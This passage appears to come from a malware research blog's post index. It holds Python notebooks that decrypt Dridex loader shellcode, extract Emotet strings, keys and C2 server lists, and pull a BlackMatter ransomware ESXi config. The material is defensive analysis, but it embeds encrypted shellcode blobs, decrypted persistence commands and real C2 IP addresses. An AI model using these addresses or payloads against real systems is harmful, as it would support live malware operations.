cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE = &#39;/tmp/dridex_shell1.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . decompressed data len: 1549 . 1549 . Shellcode Analysis . The loader checks to see if the process is 64 or 32 bit and then decryptes a shellcode blob and injects it along with a struct containing an IAT and other information. . 32bit shellcode (malshare) . To be analyzed... . gap_size = 68 for i in range(0, gap_size, 4): print(f&quot;DWORD dword_{i:0x};&quot;) . DWORD dword_0; DWORD dword_4; DWORD dword_8; DWORD dword_c; DWORD dword_10; DWORD dword_14; DWORD dword_18; DWORD dword_1c; DWORD dword_20; DWORD dword_24; DWORD dword_28; DWORD dword_2c; DWORD dword_30; DWORD dword_34; DWORD dword_38; DWORD dword_3c; DWORD dword_40; . shell_data_2 = unhex(&#39;4b93941a5f7671df49d159c96b178e1c96667e2ab79238f78d625bd468c1f2aee57a345f03721206fdee52034c3453b52c5d1fc76b2785b91e3442b9ea78da4e4f20eccb69cc1c0f2001fe7ccb6e9c5f8977f6fa89358a57ffd44f5c1e29213a3deaeb45160c655972cfcfc04a1260a89eff479e263dd500f6ec1ed713acb5bff9e2de331dc8dee30a67802dd8c66373af26c356d488013d52a220df8609d784ecad7ddeb888d436aa0c5451b69f2f03f51041538f3a2dcaf92db0968e27c81f9c34ee317777acaf53ecba288b5f0803cf29ba6170fe83f96d5c702a1c2aea4ebd21df44c62eb956db897631675f8e3f5f79e2b1498a47043b56d31d146c53fc53751433f89e8e2828c4bab1ddd49b13ec78fe91b890e617c907fde9653527b07d31801d42418e23fb9b2d715ed8b2a07495e102c97b36183e29e2baf47f&#39;) key = shell_data_2[:48][::-1] data = shell_data_2[48:] b64_data = rc4crypt(data, key) import base64 import struct cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE_2 = &#39;/tmp/dridex_shell2.bin&#39; open(SHELLCODE_FILE_2, &#39;wb&#39;).write(out) . decompressed data len: 245 . 245 . Test String Decryption . data = unhex(&#39;63208a6488442f57a8414b4928cc1bb9660867a6c23f352adfa702ff121ceee14c69499849e264128bb21bda7fa2a8493244d4377003ec3caae05dc6a76ac7678acd82ca4b2ccceaf0602504576bc9c96223fda05aba4bbff6769f74bc7a3645839a41c4f610217d74d7d203cf38a89af0c05566f5e9301ea7d83f5102e8f324f90d3d38c0773e1a8db5dc6fb5808076269b686b40c6380c37de737d8838e530fac67a&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . ROOT CIMV2 SELECT * FROM Win32_Fan *.dll *.exe ntdll.dll . data = unhex(&#39;95c985f019ba926e4c776a4f39bb87c3af575e04263a3cfbf446fe76cd45826bdfc9c381775b910daa5af895189ac2037f94d7e0cbcb9f04a44b3dade44673637e63d0aeb931ee404dee9737afe9df5fefac345edde26397a125a483bbf9e4a80012c314d14eab1fe2a997e969b313ef290f7700bd7f3a3afb3f8a493f1449ff72a2e5163c632c7a79d450e1f8618cfaa15cba132da34e83c5dfe1aecf4b016b10e489041d096388fb2ada047bc1567732fe4b2c7d7b249be25e74ee1a6ee47abda1b8efd31253186df54c518aa596c5351fbe1cd148ef4bab2645&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . S:(ML;;NW;;;LW)D:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0) Sessions %d BaseNamedObjects . data = unhex(&#39;763204228337e0fd87cd26f15d317e7753125863474a2a23cb087289562e629b87de7aebca904d887233a895007c1b7c8b01fc71443ef6ffb96a7a857d8b636bd5a0d3&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . GET POST . data = unhex(&#39;9929d0667cd2bee6ce087b584cfa8d54a813828fe28e53422b76d901b32b276fd6bf3583d4c0078646c3f7e0d908c93f798c881c00a9f7b23498892e6dea7634eaa2b1c7e6c67b34f153c9de05b775602a824dc48d52a7175c86e0112db594a53b7fd4c79689ce1adbd8b8fada3a0c03b8b980fe72f8af41ed8ed3af9a544cdf15c7e3ed8e878f61eaa41b626b5d450e65fd78b8736da4aeb1504d65352e081c877863842ab6adae783a99d525cdeb0eb078f8ee748283ce9554b88e9053b63f4c79e4479f117a341f97d7de18f4276b73ec5db445db5865bb16c8f2d819103d436c1b208cf00ee656e799559082d0996e8d89a07202915cb38ea1f3ad813b08034385703110dba092baf240fb0b8d839a07befcb05830c4a8ee25206c9539c010732a75670c8cba4db4eb8996d7d6f3012971574c3da3fb4a0e5274256ccbe3ee349e1fe5ab7249c78505cee79aa943beca99bdfb52f9aaae4d29ca9b3f26db612a1d866a2162ab96a07ad4a69544b1573c2d6e2c7d0424c97aaa23fbff7b703d4ff88d24dda7&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . Program Manager Progman AdvApi32~PsApi~shlwapi~shell32~WinInet /run /tn &#34;%ws&#34; &#34;%ws&#34; /grant:r &#34;%ws&#34;:F NTUSER.DAT winsxs x86_* amd64_* *.exe Sessions %d BaseNamedObjects . data = unhex(&#39;0921161a62f46e068fcb7050fe9d5fb793d2666a91610f5c75813f2e6a7f6846478262fcb0bd4e0e5ecdb8763266b6dba380102939f258b4e4c6e3c31481976ae308b958793d404c3dfa35a79ac4551495846111e06c4f0e5c4f9dbcf4d26fd2c9d1130852a1bd812f97d6b9b92fb919866f0a1ab95167a0d111c8b214ed78f7a0aaa18dae2ee00fb34974eb3bbc3b778c3f88f4b29dc7d1efd1793d79fa4381e2d991e0115ffc398989f531053028cddcdec0151fa888d249030604224cae2dc1fc6fcb792c4a9943e12ed6c825a69342d275fe8f3652f8f3a79d355f461a67cd3b8b4700236b6d63683e638c5c83c80d0bac05eb7f40298f97e43f4f32af9d125643ebe245a5f65a181d70bcb147f63bcf24552e782565a7dd818a4439471ff4092097aeee12453c802332346c07e80a9b31d631428f299d11b6cdd962654eb918ef68f8e6b786f3c7fc4b473e74cc2721d4a292c1f8ab99e0b5968eb6d3452f1b9a1d12a6a2255281e44f56b7b0b87b30001b19958e6681d5272c560396580c87370eadf68ae1c1022fcb05c781bcf09635b2bd648aa6fa100320c79c6a8f86a7a2bc679dad4a31faa6358b061ca98259ad6497afb43a2a98a5d1a1061c8ada7c4710c32fb7742d68bfb6e0d52f3f56cc9519e75df72c377728c2bfc58aa75bad3b136c2ba610d23c02febad47f1394db071774fa9d058ebd512bc4a411466d2a6582a651a7443cc8a3ae106af4433099f5616d3414c09788359272ac4599c76b8686eeb26ad090de576a3345cf30ad95b8053233ecff47c4315e7d30cd41387e44b241d992625dfd4cf7b0f506797a89e85914d7593cc59e2e089fbbac5a56b96824af9773822e35b948616ff348d1545933b3eb8253c59d29ebfd4001d087a457ff4b49a6eb2b4a9a2d13b1dd3c4d29db90c3ddf4434fa81246f850b719cea0450c30438cf7ca272681a0a6a76ecb6fe7b460f6703f0e3ed0ffe9c43db993e3c07a97405ea42caba91c47070dd9080e32fcd678721a032956bb393c24714c88&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) print(b64_data) out = base64.b64decode(b64_data) print(out) SHELLCODE_FILE = &#39;/tmp/dridex_shell_2.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . b&#39;o6ijqKOoo6ijqKOoo6ijqKqqqqqqqqqqrKqyqp+fn5+1o6Okqqq6qpaqqKrDw5aWt67WvaPFo6Ofw5yqqqyqvwN/EX8BfwE/AQGQgn2XWVlZWVl/WVlgfX9/WVlZWVlZWVlZWVlZmoh9WVBQUFBZWVlZYZRhnllZhVmSo2BgWVlZWVlZWVlZWVmfAQMBBAPVA8wBvAPwEBAQEFBQUFAUICAgIAEBAQHEAhAAAAAAAQHAwhARAgMRAwMEAAAUAAIAAMbIAgICAgAA/////wAAAP/KAQEBAAYABADAwgEBAwH//wEAA8TExgMBAQH/AwMDyEAACgAEAAAAAH8AMwEAAAAAAAD/v///AAAAAAcAAP8AAAAAAAAAAAAAAAAAAP//AAAAvwAAAAAAAAAAfwAA/0pKSkpLUkpKSkpPTEpKSkpKSkpKVUVASkpKRVlNRkpdSkpKSkpKSkpKSkpKSkphY2dOSkprbUpKRW1KSkRFSkoAAAACDQYGBgYOAAAAAAYGBgAGBgIGAAoKBwcGAgUFAgIAAAQEBAQAAAAOBQYGBgEGAAAIABAAGAAgACgAMACAAYIBhgD2z/4/qwCwALEAswC6+LsAwADBAMe/Yv8Ajf8AxP8Axf8A///rAf8OEggAEwkAFggAFwkAKwkArv8Hsv8AtP8Atf8AwwEAx/+/5wgA8AIA x00 x00&#39; b&#39; xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xaa xaa xaa xaa xaa xaa xaa xaa xac xaa xb2 xaa x9f x9f x9f x9f xb5 xa3 xa3 xa4 xaa xaa xba xaa x96 xaa xa8 xaa xc3 xc3 x96 x96 xb7 xae xd6 xbd xa3 xc5 xa3 xa3 x9f xc3 x9c xaa xaa xac xaa xbf x03 x7f x11 x7f x01 x7f x01? x01 x01 x90 x82} x97YYYYY x7fYY`} x7f x7fYYYYYYYYYYYY x9a x88}YPPPPYYYYa x94a x9eYY x85Y x92 xa3``YYYYYYYYYYY x9f x01 x03 x01 x04 x03 xd5 x03 xcc x01 xbc x03 xf0 x10 x10 x10 x10PPPP x14 x01 x01 x01 x01 xc4 x02 x10 x00 x00 x00 x00 x01 x01 xc0 xc2 x10 x11 x02 x03 x11 x03 x03 x04 x00 x00 x14 x00 x02 x00 x00 xc6 xc8 x02 x02 x02 x02 x00 x00 xff xff xff xff x00 x00 x00 xff xca x01 x01 x01 x00 x06 x00 x04 x00 xc0 xc2 x01 x01 x03 x01 xff xff x01 x00 x03 xc4 xc4 xc6 x03 x01 x01 x01 xff x03 x03 x03 xc8@ x00 n x00 x04 x00 x00 x00 x00 x7f x003 x01 x00 x00 x00 x00 x00 x00 xff xbf xff xff x00 x00 x00 x00 x07 x00 x00 xff x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff x00 x00 x00 xbf x00 x00 x00 x00 x00 x00 x00 x00 x7f x00 x00 xffJJJJKRJJJJOLJJJJJJJJUE@JJJEYMFJ]JJJJJJJJJJJJJJacgNJJkmJJEmJJDEJJ x00 x00 x00 x02 r x06 x06 x06 x06 x0e x00 x00 x00 x00 x06 x06 x06 x00 x06 x06 x02 x06 x00 n n x07 x07 x06 x02 x05 x05 x02 x02 x00 x00 x04 x04 x04 x04 x00 x00 x00 x0e x05 x06 x06 x06 x01 x06 x00 x00 x08 x00 x10 x00 x18 x00 x00( x000 x00 x80 x01 x82 x01 x86 x00 xf6 xcf xfe? xab x00 xb0 x00 xb1 x00 xb3 x00 xba xf8 xbb x00 xc0 x00 xc1 x00 xc7 xbfb xff x00 x8d xff x00 xc4 xff x00 xc5 xff x00 xff xff xeb x01 xff x0e x12 x08 x00 x13 t x00 x16 x08 x00 x17 t x00+ t x00 xae xff x07 xb2 xff x00 xb4 xff x00 xb5 xff x00 xc3 x01 x00 xc7 xff xbf xe7 x08 x00 xf0 x02 x00&#39; . 516 . C2 Networking . print(&quot;%d.%d.%d.%d&quot; % (0x67, 0x2a, 0x38, 0x0f)) . 103.42.56.15 . import re import pefile import struct # Change to be your own local file path SAMPLE_FILE_PATH = &#39;/tmp/dridex.bin&#39; file_data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() ip_parse_egg = rb&#39; xbb(....) x89 x45 x00 x0f xb7 x53 x04 x89 x10 x0f xb6 x4b x0b x83 xf9 x0a&#39; pe = pefile.PE(data=file_data) data_section = None for s in pe.sections: if s.Name == b&#39;.data x00 x00 x00&#39;: data_section = s.get_data() match = re.search(ip_parse_egg, file_data, re.DOTALL|re.MULTILINE) ip_table_addr = None if match: table_addr = struct.unpack(&#39;&lt;I&#39;,match.group(1))[0] print(&quot;Found data table at: %s n&quot; % hex(table_addr)) # Turn address into rva/offset and calculate table offsets table_offset = pe.get_offset_from_rva(table_addr - pe.OPTIONAL_HEADER.ImageBase) ip_table_offset = table_offset + 0xb version_table_offset = table_offset + 4 # Get bot version bot_version = struct.unpack(&#39;&lt;H&#39;, file_data[version_table_offset:version_table_offset+2])[0] print(&quot;Bot Version: %d n&quot; % bot_version) ip_table_len = ord(file_data[ip_table_offset:ip_table_offset+1]) print(&quot;IP table length: %d&quot; % ip_table_len) # Move to actual IP table start ip_table_offset += 1 # Extract the c2 ips c2_ips = [] for i in range(ip_table_len): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(file_data[ip_table_offset:ip_table_offset+1]), ord(file_data[ip_table_offset+1:ip_table_offset+2]), ord(file_data[ip_table_offset+2:ip_table_offset+3]), ord(file_data[ip_table_offset+3:ip_table_offset+4])) port_string = struct.unpack(&#39;&lt;H&#39;, file_data[ip_table_offset+4:ip_table_offset+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) c2_ips.append(&quot;%s:%s&quot; % (ip_string,port_string)) ip_table_offset += 6 . Found data table at: 0x55d020 Bot Version: 22201 IP table length: 3 103.42.56.15:443 169.255.57.61:8116 128.199.192.135:6602 .",
            "url": "https://research.openanalysis.net/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "relUrl": "/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "date": " ‚Ä¢ Nov 30, 2021"
        }
        
    
  
    
        ,"post69": {
            "title": "Emotet Config Extractor",
            "content": "Overview . Sample: c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 . Unpacked: eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . References: . Malshare Sample (Unpacked) | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Load The Sample . import struct import pefile EMOTET_FILE = r&#39;/tmp/emotet3.bin&#39; data = open(EMOTET_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) . txt_data = None for s in pe.sections: if b&#39;.text&#39; in s.Name: txt_data = s.get_data() print(txt_data[:100]) . b&#39; x03 xf2y x1a x0e xf2y x1aF xb1:JV xb05S@ xb05UA x90 x13 xa3 x91 x9f&amp; xccr xbf xa6 x021 x91H xa5= x96 x07 x00 x00 x00 x00 x00 x00 x00 x00&lt;n xbf x19 n xbf x19q x07 xdckS x1d xd0 x7fHN xefkU x03 xd6mU x18 xda9l x1c xd0oU n xdak,Gd&gt; xc0I xbd x9a x9d&gt;( xc2g xd3 x03 xdb&#39; . Decrypt Strings Table . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(s): return all(c &lt; 128 for c in s) strings_table = [] ECS1_string = None ECK1_string = None for i in range(0,0x1000,4): candidate_1 = struct.unpack(&#39;&lt;I&#39;,txt_data[i:i+4])[0] candidate_2 = struct.unpack(&#39;&lt;I&#39;,txt_data[i+4:i+8])[0] if (candidate_1 &amp; 0xffffff00) ^ (candidate_2 &amp; 0xffffff00) == 0: # We have a match! key = txt_data[i:i+4] data_len = candidate_1 ^ candidate_2 enc_data = txt_data[i+8:i+8+data_len] ptxt_data = xor_decrypt(enc_data, key) if is_ascii(ptxt_data): if ptxt_data != b&#39;&#39;: strings_table.append(ptxt_data.decode(&#39;latin1&#39;)) if b&#39;ECS1&#39; == ptxt_data[:4]: ECS1_string = ptxt_data if b&#39;ECK1&#39; == ptxt_data[:4]: ECK1_string = ptxt_data # Print our strings print(ECS1_string) print(ECK1_string) for s in strings_table: print(s) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECCPUBLICBLOB Microsoft Primitive Provider SHA256 ObjectLength ECDSA_P256 HASH AES ECDH_P256 KeyDataBlob %s %s %s * %s:Zone.Identifier %s %s.exe Cookie: %s=%s --%S-- %u.%u.%u.%u Content-Type: multipart/form-data; boundary=%s --%S Content-Disposition: form-data; name=&#34;%S&#34;; filename=&#34;%S&#34; Content-Type: application/octet-stream %s %s %s rundll32.exe &#34;%s %s&#34;,%s SOFTWARE Microsoft Windows CurrentVersion Run Control_RunDLL %s %s%x %s rundll32.exe &#34;%s %s&#34;,%s %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL POST userenv.dll shell32.dll bcrypt.dll crypt32.dll wtsapi32.dll urlmon.dll shlwapi.dll wininet.dll advapi32.dll %s_%08X %s%s.dll %s%s.exe DllRegisterServer %s regsvr32.exe -s &#34;%s&#34; %s rundll32.exe &#34;%s&#34;,Control_RunDLL %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL WinSta0 Default RNG . Elliptic Curve Keys . References: . https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptimportkeypair | https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_ecckey_blob | https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/shared/bcrypt.h | https://pycryptodome.readthedocs.io/en/latest/src/public_key/ecc.html | . print(ECS1_string) print(ECK1_string) # Extract ECS1 key ECS1_key_len = struct.unpack(&#39;&lt;I&#39;,ECS1_string[4:8])[0] ECS1_x = int.from_bytes(ECS1_string[8:8+ECS1_key_len], &quot;big&quot;) ECS1_y = int.from_bytes(ECS1_string[8+ECS1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECS1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECS1_x, point_y=ECS1_y) print(&quot; nECS1 Key&quot;) print(ECS1_key.export_key(format=&quot;PEM&quot;)) # Extract ECK1 key ECK1_key_len = struct.unpack(&#39;&lt;I&#39;,ECK1_string[4:8])[0] ECK1_x = int.from_bytes(ECK1_string[8:8+ECK1_key_len], &quot;big&quot;) ECK1_y = int.from_bytes(ECK1_string[8+ECK1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECK1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECK1_x, point_y=ECK1_y) print(&quot; nECK1 Key&quot;) print(ECK1_key.export_key(format=&quot;PEM&quot;)) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECS1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9C8agzYaJ1GMJPLKqOyFrlJZUXVI lAZwAnOq6JrEKHtWCQ+8CHuAIXqmKH6WRbnDw1wmdM/YvqKFH36nqC2VNA== --END PUBLIC KEY-- ECK1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE2DWT12OLUMXfzeFp+bE2AJubVDsW NqJdRC6yODDYRzYuuNL0i2rI2Ex6RUQaBvqPOL7a+wCWnIQszh42gCRQlg== --END PUBLIC KEY-- . C2 Ground Truth . 81.0.236.93:443 . data_data = None for s in pe.sections: if b&#39;.data&#39; in s.Name: data_data = s.get_data() print(data_data[:100]) key = data_data[:4] data_len = struct.unpack(&#39;&lt;I&#39;,data_data[:4])[0] ^ struct.unpack(&#39;&lt;I&#39;,data_data[4:8])[0] enc_data = data_data[8:8+data_len] ptxt_data = xor_decrypt(enc_data, key) print(tohex(ptxt_data)) print(&quot; n== C2 List== &quot;) for i in range(0,len(ptxt_data),8): print(&quot;%d.%d.%d.%d:%d&quot; % (ptxt_data[i+0],ptxt_data[i+1],ptxt_data[i+2],ptxt_data[i+3],struct.unpack(&#39;&gt;H&#39;,ptxt_data[i+4:i+6])[0])) . b&#39;5 x84 xe9? x95 x84 xe9? x066 xd4 x034? xe9&gt; x9dA x1315 xd4 xe9&gt; x18 xcb xc8 x0f* x14 xe9&gt; xf1 xa8 x8b x81* x14 xe9&gt; x84 xcc xb91., xe9&gt; x06V x1b xd5* x14 xe9&gt; x8c x10@5* x14 xe9&gt; xbb x802 x92* x14 xe9&gt;{ xab%o4? xe9&gt;{ xaa xa0B4? xe9&gt; x10 xa8 x1d x8e* x14 xe9&gt; x10 xbf8 xb2&#39; b&#39;33b23d3c01bb0001a8c5fa0e005000012d4f21301f900001c42c62be1f900001b148500e1ba8000133d2f2ea1f900001b994a90a1f9000018e04dbad1f9000014e2fcc5001bb00014e2e497d01bb0001252cf4b11f900001253bd18d1f900001bffc6710005000013626f2b901bb000155d643cb1f9000013625e47a01bb0001cf9451771f900001c34def271f900001422a399501bb0001c39a922301bb0001&#39; == C2 List== 51.178.61.60:443 168.197.250.14:80 45.79.33.48:8080 196.44.98.190:8080 177.72.80.14:7080 51.210.242.234:8080 185.148.169.10:8080 142.4.219.173:8080 78.47.204.80:443 78.46.73.125:443 37.44.244.177:8080 37.59.209.141:8080 191.252.103.16:80 54.38.242.185:443 85.214.67.203:8080 54.37.228.122:443 207.148.81.119:8080 195.77.239.39:8080 66.42.57.149:443 195.154.146.35:443 .",
            "url": "https://research.openanalysis.net/emotet/malware/config/2021/11/18/emotet.html",
            "relUrl": "/emotet/malware/config/2021/11/18/emotet.html",
            "date": " ‚Ä¢ Nov 18, 2021"
        }
        
    
  
    
        ,"post70": {
            "title": "BlackMatter Ransomware ESXi ELF Config",
            "content": "Overview . Sample: f864922f947a6bb7d894245b53795b54b9378c0f7633c521240488e86f60c2c5 . MalwareBazaar Database . Requirements: . pip install pyelftools | . Examining our ELF file . from __future__ import print_function import sys sys.path[0:0] = [&#39;.&#39;, &#39;..&#39;] from elftools.elf.elffile import ELFFile def process_file(filename): print(&#39;Sections in ELF file:&#39;, filename) with open(filename, &#39;rb&#39;) as f: elffile = ELFFile(f) for section in elffile.iter_sections(): print(&#39; &#39; + section.name) process_file(&quot;tmp/blackmatter_elf.inactive&quot;) . Sections in ELF file: tmp/blackmatter_elf.inactive .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .text .fini .rodata .app.version .cfgETD .eh_frame_hdr .eh_frame .gcc_except_table .tbss .init_array .fini_array .jcr .data.rel.ro .dynamic .got .data nocommon .bss .comment .shstrtab . We can see that our ELF payload has a section named .cfgETD This is where the config data resides in current BlackMatter ELF payloads . def get_config_section_data(filename): with open(filename, &#39;rb&#39;) as f: elffile = ELFFile(f) for section in elffile.iter_sections(): if section.name.startswith(&#39;.cfgETD&#39;): return section.data() config_data = get_config_section_data(&quot;tmp/blackmatter_elf.inactive&quot;) . config_string = config_data.decode(&quot;utf-8&quot;) #we do not add the &#39;validate=True&#39; parameter print(config_string) #if this does not print out a clear base64 string, something has gone wrong . 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 